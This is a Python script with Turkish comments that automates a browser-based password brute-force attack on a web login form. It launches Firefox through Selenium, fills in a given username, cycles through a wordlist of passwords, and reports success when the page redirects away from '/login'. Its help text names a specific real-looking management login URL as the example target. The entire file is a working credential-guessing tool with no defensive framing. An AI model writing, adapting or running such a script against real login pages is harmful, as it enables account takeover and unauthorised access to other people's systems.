import argparse
import sys
import time
from selenium import webdriver
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.firefox import GeckoDriverManager

def main():
    parser = argparse.ArgumentParser(description='Gelişmiş Selenium tabanlı görsel bruteforce aracı.')
    parser.add_argument('url', help='Hedef web sitesinin URL\'si (örn: https://mgmt.yenihavale.net/login)')
    parser.add_argument('-u', '--username', required=True, help='Kullanılacak kullanıcı adı.')
    parser.add_argument('-w', '--wordlist', required=True, help='Denenecek şifrelerin bulunduğu dosya.')

    args = parser.parse_args()

    print(f"[*] Hedef: {args.url}")
    print(f"[*] Kullanıcı Adı: {args.username}")
    print(f"[*] Şifre Listesi: {args.wordlist}")
    print("[*] Tarayıcı başlatılıyor...")

    try:
        with open(args.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"Hata: '{args.wordlist}' kelime listesi dosyası bulunamadı.", file=sys.stderr)
        sys.exit(1)

    # Selenium WebDriver'ı başlat
    service = None
    driver = None
    try:
        service = FirefoxService(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service)
    except Exception as e:
        print(f"WebDriver başlatılırken bir hata oluştu: {e}", file=sys.stderr)
        print("Lütfen Firefox tarayıcısının sisteminizde kurulu olduğundan emin olun.", file=sys.stderr)
        sys.exit(1)

    # --- YENİ MANTIK: SAYFAYI BİR KEZ YÜKLE VE BEKLE ---
    try:
        driver.get(args.url)
        print("[*] Sayfa yüklendi. Başlangıç animasyonları için 30 saniye bekleniyor...")
        time.sleep(30)
        print("[*] Bekleme tamamlandı. Denemeler başlıyor.")
    except Exception as e:
        print(f"Hedef URL yüklenirken hata oluştu: {e}", file=sys.stderr)
        driver.quit()
        sys.exit(1)


    found_password = None
    # Elementleri döngü dışında bir kez bulmayı deneyelim.
    # Eğer sayfa yapısı sabitse bu daha hızlı çalışır.
    try:
        USERNAME_SELECTOR = (By.CSS_SELECTOR, "input[placeholder='Kullanıcı Adı']")
        PASSWORD_SELECTOR = (By.CSS_SELECTOR, "input[placeholder='Şifre']")
        LOGIN_BUTTON_SELECTOR = (By.CSS_SELECTOR, "button[type='submit']")

        wait = WebDriverWait(driver, 10)
        username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
        password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
        login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
        
        username_field.send_keys(args.username)

    except TimeoutException:
        print("\nHata: Giriş formundaki elementler (kullanıcı adı, şifre) bulunamadı.", file=sys.stderr)
        print("Lütfen script içerisindeki 'USERNAME_SELECTOR' ve 'PASSWORD_SELECTOR' değerlerini kontrol edin.", file=sys.stderr)
        driver.quit()
        sys.exit(1)


    for password in passwords:
        if found_password:
            break
        
        try:
            print(f"[*] Denenen şifre: {password}", end='\r')
            
            password_field.clear()
            password_field.send_keys(password)
            login_button.click()
            
            # Başarılı girişten sonra URL'nin değişmesini bekleyelim.
            # 3 saniye içinde URL'de "/login" ifadesi hala varsa, başarısız olduğunu varsay.
            WebDriverWait(driver, 3).until(lambda d: "/login" not in d.current_url)
            
            # Eğer yukarıdaki bekleme TimeoutException fırlatmazsa, URL değişmiş demektir.
            current_url = driver.current_url
            print(f"\n[+] BAŞARILI! Şifre bulundu: {password}")
            print(f"    -> Yönlendirilen URL: {current_url}")
            found_password = password
            print("Tarayıcı 30 saniye sonra kapanacak...")
            time.sleep(30)
            break

        except TimeoutException:
            # URL değişmedi, yani giriş başarısız. Bir sonraki şifreye geç.
            continue
        except Exception as e:
            print(f"\nBeklenmedik bir hata oluştu: {e}")
            print("Sayfa yeniden yükleniyor ve devam ediliyor...")
            driver.get(args.url)
            time.sleep(5)
            # Elementleri yeniden bulmamız gerekebilir.
            try:
                username_field = wait.until(EC.visibility_of_element_located(USERNAME_SELECTOR))
                password_field = wait.until(EC.visibility_of_element_located(PASSWORD_SELECTOR))
                login_button = wait.until(EC.element_to_be_clickable(LOGIN_BUTTON_SELECTOR))
                username_field.clear()
                username_field.send_keys(args.username)
            except:
                print("Elementler yeniden bulunamadı. Script durduruluyor.")
                break


    if not found_password:
        print("\n[-] Şifre bulunamadı.")

    driver.quit()
    print("[*] Araç kapatıldı.")

if __name__ == '__main__':
    main() 